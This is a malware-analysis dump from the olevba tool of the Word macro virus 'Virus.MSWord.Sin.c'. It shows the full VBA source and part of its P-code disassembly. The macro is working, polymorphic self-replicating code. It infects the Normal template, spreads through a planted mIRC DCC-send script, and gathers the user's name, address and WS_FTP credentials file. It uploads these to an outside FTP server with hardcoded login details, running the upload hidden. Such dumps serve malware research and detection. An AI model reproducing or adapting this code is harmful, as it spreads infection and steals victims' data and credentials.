olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Sin.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Sin.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
GUHGDKGFQQH:    LordArz = "Technological Illusions"
YUFDCO:    NormInstalled = False
BBBBBB = LL
NOIFKRWE:    ActInstalled = False
EQPBLDQT:  N = BBBB
LKICOFRX:    Set ActCarrier = ActiveDocument.VBProject.VBComponents(1).CodeModule
RBXYHXOLD:    Set NormCarrier = NormalTemplate.VBProject.VBComponents(1).CodeModule
VVVV = L
UBSPONB:  WWWWW = RRRR
HRHIMIWDN:    NI = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(2, 1)
FBNJLX:    AI = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(2, 1)
UYVNBL:    If UCase(NI) = "ON ERROR RESUME NEXT" Then NormInstalled = True
SDEIOMS:    If UCase(AI) = "ON ERROR RESUME NEXT" Then ActInstalled = True
CCCCCC = MMM
JKVGMFYF:    If NormInstalled = False Then
WGPBMHBHE:    Set Infection = NormCarrier
CBDKAFXMOKA:    Set Carrier = ActCarrier
QFNJPHUINF:    Else
JJJ = G
ADSAVUJHRNN:    Set Infection = ActCarrier
KKKKK = XXXX
BDFJDTW:  XXXX = QQ
XCIYMPMLNI:    Set Carrier = NormCarrier
V = CCC
EUVDWSGVDB:  V = VVVVVV
WDFTLMML:    End If
FFFGGJFY:    DoEvents
GNQTSWJQ:    Close
XMPVOL:    Tr1 = Dir(CurDir & "\script.ini", vbNormal)
ACOWWMRCEJW:    Tr2 = UCase(Right(CurDir, 8))
UU = JJJJJ
UQGGKATB:    Tr3 = Dir("C" & Chr(58) & "\MIRC", vbDirectory)
TLTPKBK:    If Tr1 <> "" Then SDir = CurDir & "\script.ini"
DHUCUOHBEUM:    If Tr2 = "DOWNLOAD" Then SDir = CurDir & "\..\Script.ini"
TYNMFSF:    If Tr3 <> "" Then SDir = "C" & Chr(58) & "\MIRC\Script.ini"
LLL = MMMMM
DNUXPKOPOO:    If SDir <> "" Then
TBSNMKLF:  BBBB = JJJJ
VCLUTLKMK:    Open SDir For Output As #1
MJEYYXNUUS:    Print #1, "n0=on 1" & Chr(59) & "JOIN" & Chr(59) & "#" & Chr(59) & "if ( $me != $nick ) { /dcc send $nick " & ThisDocument.FullName & " }"
TKYNFAQOBW:  IIIIII = KKKKK
TQKOVVV:    Close #1
XRUKVCLB:    End If
RXYDPGDPQ:    DoEvents
FF = KKKKK
WJNKAEVQAL:    WinPath = Environ("WINDIR")
HKQHSYJABPU:    If Application.Tasks.Exists("Sockets Window") = True And System.PrivateProfileString("", "HKEY_CURRENT_USER\Software", "") = "" Or System.PrivateProfileString("", "HKEY_CURRENT_USER\Software", "") >= Day(Date) + 14 Then
TTTT = SSSSS
BYILFJUA:    With Application.FileSearch
RQKDWDOURTY:    .FileName = "WS_FTP.ini"
UU = DDD
HJNWXBUKQM:    .LookIn = "C" & Chr(58) & "\"
UAVEDAYJSW:    .SearchSubFolders = True
FFFFF = C
KYNMAVW:    .MatchTextExactly = True
QDEXPQSLA:    .FileType = msoFileTypeAllFiles
ARVAAFB:    .Execute
VYPWDHLLP:    WsPath = .FoundFiles(1)
ORGUXYPMAOQ:    End With
VNMCMRHHMFE:    DoEvents
QTBBRYTELMC:    If ActiveDocument.HasPassword = True Then BCK = True
SLQCYDXULAP:    DoEvents
ANQNOY:  EEEEE = YYYYYY
JJJJ = RRRR
IXBIYDDC:    Open WinPath & "\" & Application.UserName & ".dat" For Output As #10
O = JJJJJJ
LNRLJGF:  AAAAA = OO
HVMLDXOKUGV:    Print #10, Application.UserName
DSFEGWJA:    Print #10, Application.UserAddress
FLHYATL:    If BCK = True Then Print #10, ActiveDocument.FullName
DDGKLH:    If WsPath <> "" Then Print #10, "WS_FTP"
VMXJDCEYRQ:  P = WW
OOOOO = LLLLLL
TTCFVGUQSKE:    Close #10
YSHEFARKJX:    Open WinPath & "\Command.$$$" For Output As #8
DYDRJCJ:    Print #8, "o ftp.xoom.com"
PGQDJMR:    Print #8, "User SingOfScream"
WFMQAKI:    Print #8, "Pass DIG001"
NMJJOQCQM:    Print #8, "binary"
IIIII = NNN
KIPHKSFEY:  DDD = DD
SSS = GGGG
VCOYWPGHDPE:    Print #8, "put " & Application.UserName & ".dat"
NBWTYAGBF:    If WsPath <> "" Then Print #8, "put " & WsPath
AQDEIWIBKS:    If BCK = True Then Print #8, "put " & ActiveDocument.FullName
XPYBBIWJ:    Print #8, "quit"
TGEFXPYPON:    Close
WKVOIRP:    Shell WinPath & "command.com /c FTP.exe -n -s:Command.$$$", vbHide
GWDJAR:    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software", "") = Day(Date)
JAWFRQLEDN:    End If
LAXLPSNWWJ:    For x = 1 To ThisDocument.Variables.Count
DDXDDY:    ThisDocument.Variables(x).Delete
QHPBFD:    Next x
KKKKKK = K
OYCWIIMQR:    For x = 1 To Normal.ThisDocument.Variables.Count
LLDUXMUSSR:    Normal.ThisDocument.Variables(x).Delete
WUNXIYDJQX:    Next x
LBCFHD:    With Carrier
PVGOJDC:    UECode = .Lines(1, 2) & Chr(13)
AEBMOT:  IIIII = NNNN
IXDUPHWFJ:    For x = 5 To .CountOfLines - 1
LGYJQUWYC:  GG = GGGGG
VHEOIKNRQS:    VCCode = .Lines(x, 1)
JOOMCI:    If VCCode = "End Sub" Then Exit For
FUBYETWMUU:    For i = 1 To 20
XLRDIJRGXB:    If Mid(VCCode, i, 1) = ":" Then VCCode = Right(VCCode, Len(VCCode) - i)
XQVWVBTJAA:  BBBBBB = VVVVVV
ACPLUE:    Next i
RRRRR = CCCCC
WYCIVQO:    factor = ""
RNLLKYUTS:    For Y = 1 To Int(Rnd * 6) + 6
D = LLLLL
VUXALG:  GGG = AAAA
SSS = SSSSSS
SRMSEJPBFQV:    factor = factor & Chr(Int(Rnd * 25) + 65)
OWCUYAY:  FFFFF = HH
JFMGSVRV:    Next Y
UIVUJHDOJW:    make_morph = factor & ": "
CCCC = TT
JVUKYPFICUA:    VirCode = VirCode & make_morph & " " & VCCode & Chr(13)
KAVKSEEBE:  MMMMMM = MMMMM
FITVGJNIBNJ:    If Int(Rnd * 10) > 7 Then VirCode = VirCode & String(Int(Rnd * 6) + 1, Chr(Int(Rnd * 25) + 65)) & " = " & String(Int(Rnd * 6) + 1, Chr(Int(Rnd * 25) + 65)) & Chr(13)
BBBB = FFFF
CHPYHRDTA:    Next x
XPPCBBW:    VirCode = UECode & VirCode & "End Sub"
PDJEFFOK:    End With
VCIDRVCS:    Normal.ThisDocument.Variables.Add "VCode", VirCode
JAITHPW:    ResetMe = "Private Sub Document_Close()" & Chr(13)
VWMQQYA:  DDDDDD = QQQ
DBIVBAOBUYM:    ResetMe = ResetMe & String(150, Chr(9)) & "With ThisDocument.VBProject.VBComponents(1).CodeModule: .DeleteLines 1, .CountOfLines: .InsertLines 1, Normal.ThisDocument.Variables(1).Value: End With: ThisDocument.Save" & Chr(13)
YYNXLVEHTD:    ResetMe = ResetMe & "End Sub"
DDCYUEWWK:    With ActCarrier
UQBOICEEXJX:    .DeleteLines 1, .CountOfLines
RAIDFTHT:    .InsertLines 1, ResetMe
NHVTUGFMKA:    End With
GQYTPXRKLGG:    With NormCarrier
JSJVBI:  IIIII = W
WWWWWW = YYY
PGCQNB:    .DeleteLines 1, .CountOfLines
GKYOOEPXS:    .InsertLines 1, ResetMe
NNNN = QQQQQQ
JTMRLO:  MMMM = OOOOOO
JJJJJJ = III
NHKIELEJBUD:    End With
JOHQQG:    ActiveDocument.Save
IIMAILUC:    NormalTemplate.Save
LL = F
FLRCREOVR:  QQQQQQ = FFFFF
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Sin.c
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 13722 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	Label GUHGDKGFQQH 
' 	LitStr 0x0017 "Technological Illusions"
' 	St LordArz 
' Line #3:
' 	Label YUFDCO 
' 	LitVarSpecial (False)
' 	St NormInstalled 
' Line #4:
' 	Ld LL 
' 	St BBBBBB 
' Line #5:
' 	Label NOIFKRWE 
' 	LitVarSpecial (False)
' 	St ActInstalled 
' Line #6:
' 	Label EQPBLDQT 
' 	Ld BBBB 
' 	St N 
' Line #7:
' 	Label LKICOFRX 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set ActCarrier 
' Line #8:
' 	Label RBXYHXOLD 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set NormCarrier 
' Line #9:
' 	Ld L 
' 	St VVVV 
' Line #10:
' 	Label UBSPONB 
' 	Ld RRRR 
' 	St WWWWW 
' Line #11:
' 	Label HRHIMIWDN 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St NI 
' Line #12:
' 	Label FBNJLX 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St AI 
' Line #13:
' 	Label UYVNBL 
' 	Ld NI 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0014 "ON ERROR RESUME NEXT"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St NormInstalled 
' 	EndIf 
' Line #14:
' 	Label SDEIOMS 
' 	Ld AI 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0014 "ON ERROR RESUME NEXT"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St ActInstalled 
' 	EndIf 
' Line #15:
' 	Ld MMM 
' 	St CCCCCC 
' Line #16:
' 	Label JKVGMFYF 
' 	Ld NormInstalled 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #17:
' 	Label WGPBMHBHE 
' 	SetStmt 
' 	Ld NormCarrier 
' 	Set Infection 
' Line #18:
' 	Label CBDKAFXMOKA 
' 	SetStmt 
' 	Ld ActCarrier 
' 	Set Carrier 
' Line #19:
' 	Label QFNJPHUINF 
' 	ElseBlock 
' Line #20:
' 	Ld G 
' 	St JJJ 
' Line #21:
' 	Label ADSAVUJHRNN 
' 	SetStmt 
' 	Ld ActCarrier 
' 	Set Infection 
' Line #22:
' 	Ld XXXX 
' 	St KKKKK 
' Line #23:
' 	Label BDFJDTW 
' 	Ld QQ 
' 	St XXXX 
' Line #24:
' 	Label XCIYMPMLNI 
' 	SetStmt 
' 	Ld NormCarrier 
' 	Set Carrier 
' Line #25:
' 	Ld CCC 
' 	St V 
' Line #26:
' 	Label EUVDWSGVDB 
' 	Ld VVVVVV 
' 	St V 
' Line #27:
' 	Label WDFTLMML 
' 	EndIfBlock 
' Line #28:
' 	Label FFFGGJFY 
' 	ArgsCall DoEvents 0x0000 
' Line #29:
' 	Label GNQTSWJQ 
' 	CloseAll 
' Line #30:
' 	Label XMPVOL 
' 	Ld CurDir 
' 	LitStr 0x000B "\script.ini"
' 	Concat 
' 	Ld vbNormal 
' 	ArgsLd Dir 0x0002 
' 	St Tr1 
' Line #31:
' 	Label ACOWWMRCEJW 
' 	Ld CurDir 
' 	LitDI2 0x0008 
' 	ArgsLd Right 0x0002 
' 	ArgsLd UCase 0x0001 
' 	St Tr2 
' Line #32:
' 	Ld JJJJJ 
' 	St UU 
' Line #33:
' 	Label UQGGKATB 
' 	LitStr 0x0001 "C"
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0005 "\MIRC"
' 	Concat 
' 	Ld vbDirectory 
' 	ArgsLd Dir 0x0002 
' 	St Tr3 
' Line #34:
' 	Label TLTPKBK 
' 	Ld Tr1 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld CurDir 
' 	LitStr 0x000B "\script.ini"
' 	Concat 
' 	St SDir 
' 	EndIf 
' Line #35:
' 	Label DHUCUOHBEUM 
' 	Ld Tr2 
' 	LitStr 0x0008 "DOWNLOAD"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld CurDir 
' 	LitStr 0x000E "\..\Script.ini"
' 	Concat 
' 	St SDir 
' 	EndIf 
' Line #36:
' 	Label TYNMFSF 
' 	Ld Tr3 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "C"
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0010 "\MIRC\Script.ini"
' 	Concat 
' 	St SDir 
' 	EndIf 
' Line #37:
' 	Ld MMMMM 
' 	St LLL 
' Line #38:
' 	Label DNUXPKOPOO 
' 	Ld SDir 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #39:
' 	Label TBSNMKLF 
' 	Ld JJJJ 
' 	St BBBB 
' Line #40:
' 	Label VCLUTLKMK 
' 	Ld SDir 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #41:
' 	Label MJEYYXNUUS 
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "n0=on 1"
' 	LitDI2 0x003B 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0004 "JOIN"
' 	Concat 
' 	LitDI2 0x003B 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 "#"
' 	Concat 
' 	LitDI2 0x003B 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0026 "if ( $me != $nick ) { /dcc send $nick "
' 	Concat 
' 	Ld ThisDocument 
' 	MemLd FullName 
' 	Concat 
' 	LitStr 0x0002 " }"
' 	Concat 
' 	PrintItemNL 
' Line #42:
' 	Label TKYNFAQOBW 
' 	Ld KKKKK 
' 	St IIIIII 
' Line #43:
' 	Label TQKOVVV 
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #44:
' 	Label XRUKVCLB 
' 	EndIfBlock 
' Line #45:
' 	Label RXYDPGDPQ 
' 	ArgsCall DoEvents 0x0000 
' Line #46:
' 	Ld KKKKK 
' 	St FF 
' Line #47:
' 	Label WJNKAEVQAL 
' 	LitStr 0x0006 "WINDIR"
' 	ArgsLd Environ 0x0001 
' 	St WinPath 
' Line #48:
' 	Label HKQHSYJABPU 
' 	LitStr 0x000E "Sockets Window"
' 	Ld Application 
' 	MemLd Tasks 
' 	ArgsMemLd Exists 0x0001 
' 	LitVarSpecial (True)
' 	Eq 
' 	LitStr 0x0000 ""
' 	LitStr 0x001A "HKEY_CURRENT_USER\Software"
' 	LitStr 0x0000 ""
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0000 ""
' 	Eq 
' 	And 
' 	LitStr 0x0000 ""
' 	LitStr 0x001A "HKEY_CURRENT_USER\Software"
' 	LitStr 0x0000 ""
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000E 
' 	Add 
' 	Ge 
' 	Or 
' 	IfBlock 
' Line #49:
' 	Ld SSSSS 
' 	St TTTT 
' Line #50:
' 	Label BYILFJUA 
' 	StartWithExpr 
' 	Ld Application 
' 	MemLd FileSearch 
' 	With 
' Line #51:
' 	Label RQKDWDOURTY 
' 	LitStr 0x000A "WS_FTP.ini"
' 	MemStWith FileName 
' Line #52:
' 	Ld DDD 
' 	St UU 
' Line #53:
' 	Label HJNWXBUKQM 
' 	LitStr 0x0001 "C"
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	MemStWith LookIn 
' Line #54:
' 	Label UAVEDAYJSW 
' 	LitVarSpecial (True)
' 	MemStWith SearchSubFolders 
' Line #55:
' 	Ld C 
' 	St FFFFF 
' Line #56:
' 	Label KYNMAVW 
' 	LitVarSpecial (True)
' 	MemStWith MatchTextExactly 
' Line #57:
' 	Label QDEXPQSLA 
' 	Ld msoFileTypeAllFiles 
' 	MemStWith FileType 
' Line #58:
' 	Label ARVAAFB 
' 	ArgsMemCallWith Execute 0x0000 
' Line #59:
' 	Label VYPWDHLLP 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith FoundFiles 0x0001 
' 	St WsPath 
' Line #60:
' 	Label ORGUXYPMAOQ 
' 	EndWith 
' Line #61:
' 	Label VNMCMRHHMFE 
' 	ArgsCall DoEvents 0x0000 
' Line #62:
' 	Label QTBBRYTELMC 
' 	Ld ActiveDocument 
' 	MemLd HasPassword 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St BCK 
' 	EndIf 
' Line #63:
' 	Label SLQCYDXULAP 
' 	ArgsCall DoEvents 0x0000 
' Line #64:
' 	Label ANQNOY 
' 	Ld YYYYYY 
' 	St EEEEE 
' Line #65:
' 	Ld RRRR 
' 	St JJJJ 
' Line #66:
' 	Label IXBIYDDC 
' 	Ld WinPath 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x0004 ".dat"
' 	Concat 
' 	LitDI2 0x000A 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #67:
' 	Ld JJJJJJ 
' 	St O 
' Line #68:
' 	Label LNRLJGF 
' 	Ld OO 
' 	St AAAAA 
' Line #69:
' 	Label HVMLDXOKUGV 
' 	LitDI2 0x000A 
' 	Sharp 
' 	PrintChan 
' 	Ld Application 
' 	MemLd UserName 
' 	PrintItemNL 
' Line #70:
' 	Label DSFEGWJA 
' 	LitDI2 0x000A 
' 	Sharp 
' 	PrintChan 
' 	Ld Application 
' 	MemLd UserAddress 
' 	PrintItemNL 
' Line #71:
' 	Label FLHYATL 
' 	Ld BCK 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x000A 
' 	Sharp 
' 	PrintChan 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	PrintItemNL 
' 	EndIf 
' Line #72:
' 	Label DDGKLH 
' 	Ld WsPath 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x000A 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "WS_FTP"
' 	PrintItemNL 
' 	EndIf 
' Line #73:
' 	Label VMXJDCEYRQ 
' 	Ld WW 
' 	St P 
' Line #74:
' 	Ld LLLLLL 
' 	St OOOOO 
' Line #75:
' 	Label TTCFVGUQSKE 
' 	LitDI2 0x000A 
' 	Sharp 
' 	Close 0x0001 
' Line #76:
' 	Label YSHEFARKJX 
' 	Ld WinPath 
' 	LitStr 0x000C "\Command.$$$"
' 	Concat 
' 	LitDI2 0x0008 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #77:
' 	Label DYDRJCJ 
' 	LitDI2 0x0008 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "o ftp.xoom.com"
' 	PrintItemNL 
' Line #78:
' 	Label PGQDJMR 
' 	LitDI2 0x0008 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0011 "User SingOfScream"
' 	PrintItemNL 
' Line #79:
' 	Label WFMQAKI 
' 	LitDI2 0x0008 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "Pass DIG001"
' 	PrintItemNL 
' Line #80:
' 	Label NMJJOQCQM 
' 	LitDI2 0x0008 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "binary"
' 	PrintItemNL 
' Line #81:
' 	Ld NNN 
' 	St IIIII 
' Line #82:
' 	Label KIPHKSFEY 
' 	Ld DD 
' 	St DDD 
' Line #83:
' 	Ld GGGG 
' 	St SSS 
' Line #84:
' 	Label VCOYWPGHDPE 
' 	LitDI2 0x0008 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "put "
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x0004 ".dat"
' 	Concat 
' 	PrintItemNL 
' Line #85:
' 	Label NBWTYAGBF 
' 	Ld WsPath 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0008 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "put "
' 	Ld WsPath 
' 	Concat 
' 	PrintItemNL 
' 	EndIf 
' Line #86:
' 	Label AQDEIWIBKS 
' 	Ld BCK 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0008 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "put "
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Concat 
' 	PrintItemNL 
' 	EndIf 
' Line #87:
' 	Label XPYBBIWJ 
' 	LitDI2 0x0008 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "quit"
' 	PrintItemNL 
' Line #88:
' 	Label TGEFXPYPON 
' 	CloseAll 
' Line #89:
' 	Label WKVOIRP 
' 	Ld WinPath 
' 	LitStr 0x0028 "command.com /c FTP.exe -n -s:Command.$$$"
' 	Concat 
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #90:
' 	Label GWDJAR 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitStr 0x0000 ""
' 	LitStr 0x001A "HKEY_CURRENT_USER\Software"
' 	LitStr 0x0000 ""
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #91:
' 	Label JAWFRQLEDN 
' 	EndIfBlock 
' Line #92:
' 	Label LAXLPSNWWJ 
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd Variables 
' 	MemLd Count 
' 	For 
' Line #93:
' 	Label DDXDDY 
' 	Ld x 
' 	Ld ThisDocument 
' 	ArgsMemLd Variables 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #94:
' 	Label QHPBFD 
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #95:
' 	Ld K 
' 	St KKKKKK 
' Line #96:
' 	Label OYCWIIMQR 
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Normal 
' 	MemLd ThisDocument 
' 	MemLd Variables 
' 	MemLd Count 
' 	For 
' Line #97:
' 	Label LLDUXMUSSR 
' 	Ld x 
' 	Ld Normal 
' 	MemLd ThisDocument 
' 	ArgsMemLd Variables 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #98:
' 	Label WUNXIYDJQX 
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #99:
' 	Label LBCFHD 
' 	StartWithExpr 
' 	Ld Carrier 
' 	With 
' Line #100:
' 	Label PVGOJDC 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	ArgsMemLdWith Lines 0x0002 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St UECode 
' Line #101:
' 	Label AEBMOT 
' 	Ld NNNN 
' 	St IIIII 
' Line #102:
' 	Label IXDUPHWFJ 
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0005 
' 	MemLdWith CountOfLines 
' 	LitDI2 0x0001 
' 	Sub 
' 	For 
' Line #103:
' 	Label LGYJQUWYC 
' 	Ld GGGGG 
' 	St GG 
' Line #104:
' 	Label VHEOIKNRQS 
' 	Ld x 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	St VCCode 
' Line #105:
' 	Label JOOMCI 
' 	Ld VCCode 
' 	LitStr 0x0007 "End Sub"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFor 
' 	EndIf 
' Line #106:
' 	Label FUBYETWMUU 
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0014 
' 	For 
' Line #107:
' 	Label XLRDIJRGXB 
' 	Ld VCCode 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 ":"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld VCCode 
' 	Ld VCCode 
' 	FnLen 
' 	Ld i 
' 	Sub 
' 	ArgsLd Right 0x0002 
' 	St VCCode 
' 	EndIf 
' Line #108:
' 	Label XQVWVBTJAA 
' 	Ld VVVVVV 
' 	St BBBBBB 
' Line #109:
' 	Label ACPLUE 
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #110:
' 	Ld CCCCC 
' 	St RRRRR 
' Line #111:
' 	Label WYCIVQO 
' 	LitStr 0x0000 ""
' 	St factor 
' Line #112:
' 	Label RNLLKYUTS 
' 	StartForVariable 
' 	Ld Y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x0006 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0006 
' 	Add 
' 	For 
' Line #113:
' 	Ld LLLLL 
' 	St D 
' Line #114:
' 	Label VUXALG 
' 	Ld AAAA 
' 	St GGG 
' Line #115:
' 	Ld SSSSSS 
' 	St SSS 
' Line #116:
' 	Label SRMSEJPBFQV 
' 	Ld factor 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St factor 
' Line #117:
' 	Label OWCUYAY 
' 	Ld HH 
' 	St FFFFF 
' Line #118:
' 	Label JFMGSVRV 
' 	StartForVariable 
' 	Ld Y 
' 	EndForVariable 
' 	NextVar 
' Line #119:
' 	Label UIVUJHDOJW 
' 	Ld factor 
' 	LitStr 0x0002 ": "
' 	Concat 
' 	St make_morph 
' Line #120:
' 	Ld TT 
' 	St CCCC 
' Line #121:
' 	Label JVUKYPFICUA 
' 	Ld VirCode 
' 	Ld make_morph 
' 	Concat 
' 	LitStr 0x0001 " "
' 	Concat 
' 	Ld VCCode 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St VirCode 
' Line #122:
' 	Label KAVKSEEBE 
' 	Ld MMMMM 
' 	St MMMMMM 
' Line #123:
' 	Label FITVGJNIBNJ 
' 	Ld Rnd 
' 	LitDI2 0x000A 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0007 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld VirCode 
' 	Ld Rnd 
' 	LitDI2 0x0006 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	ArgsLd String$ 0x0002 
' 	Concat 
' 	LitStr 0x0003 " = "
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0006 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	ArgsLd String$ 0x0002 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St VirCode 
' 	EndIf 
' Line #124:
' 	Ld FFFF 
' 	St BBBB 
' Line #125:
' 	Label CHPYHRDTA 
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #126:
' 	Label XPPCBBW 
' 	Ld UECode 
' 	Ld VirCode 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	St VirCode 
' Line #127:
' 	Label PDJEFFOK 
' 	EndWith 
' Line #128:
' 	Label VCIDRVCS 
' 	LitStr 0x0005 "VCode"
' 	Ld VirCode 
' 	Ld Normal 
' 	MemLd ThisDocument 
' 	MemLd Variables 
' 	ArgsMemCall Add 0x0002 
' Line #129:
' 	Label JAITHPW 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St ResetMe 
' Line #130:
' 	Label VWMQQYA 
' 	Ld QQQ 
' 	St DDDDDD 
' Line #131:
' 	Label DBIVBAOBUYM 
' 	Ld ResetMe 
' 	LitDI2 0x0096 
' 	LitDI2 0x0009 
' 	ArgsLd Chr 0x0001 
' 	ArgsLd String$ 0x0002 
' 	Concat 
